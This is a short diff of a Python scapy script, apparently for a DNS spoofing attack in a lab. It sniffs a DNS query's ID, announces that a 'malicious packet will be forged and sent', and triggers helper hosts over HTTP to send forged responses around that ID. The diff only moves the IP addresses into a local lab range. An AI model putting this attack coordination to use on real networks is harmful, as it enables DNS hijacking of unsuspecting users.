@@ -2,7 +2,7 @@ import requests
 from scapy.all import *
 import threading
 
-dst_ip="3.3.3.2"
+dst_ip="192.168.1.11"
 src_ip="192.168.1.3"
 
 
@@ -26,7 +26,7 @@ if __name__ == "__main__":
 			qid=dns.id
 			print("Malicious packet will be forged and sent - QID " + str(qid))
 			
-			threading.Thread(target=requests.get, args=('http://1.1.1.5:8888?start_qid=' + str(qid-2),)).start()
-			threading.Thread(target=requests.get, args=('http://1.1.1.6:8888?start_qid=' + str(qid-1000),)).start()
-			threading.Thread(target=requests.get, args=('http://1.1.1.7:8888?start_qid=' + str(qid+1000),)).start()
+			threading.Thread(target=requests.get, args=('http://192.168.1.8:8888?start_qid=' + str(qid-2),)).start()
+			threading.Thread(target=requests.get, args=('http://192.168.1.9:8888?start_qid=' + str(qid-1000),)).start()
+			threading.Thread(target=requests.get, args=('http://192.168.1.10:8888?start_qid=' + str(qid+1000),)).start()
 		
